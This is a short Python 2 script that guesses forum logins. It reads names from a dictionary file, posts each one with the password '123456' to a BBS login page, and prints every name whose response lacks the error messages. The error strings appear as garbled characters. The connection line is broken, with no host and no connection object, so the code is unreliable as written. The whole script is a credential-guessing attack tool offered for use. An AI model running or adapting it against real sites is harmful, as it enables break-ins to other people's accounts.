#coding: gbk
import httplib, urllib

def Check(username, password):
	params = urllib.urlencode(
		{'userid': username, 'passwd': password})
	headers = {"Content-type":
		"application/x-www-form-urlencoded"}
	conn = ("")
	conn.request("POST",
			"/bbs/bbslog2.php", params, headers)
	res = conn.getresponse().read()
	conn.close()
	if res.find("���벻��ȷ") != -1:
		return False
	elif res.find("����������û�") != -1:
		return False
	else:
		return True

for i in open("common_pass.dic"):
	if Check(i.rstrip(),"123456"):
		print i 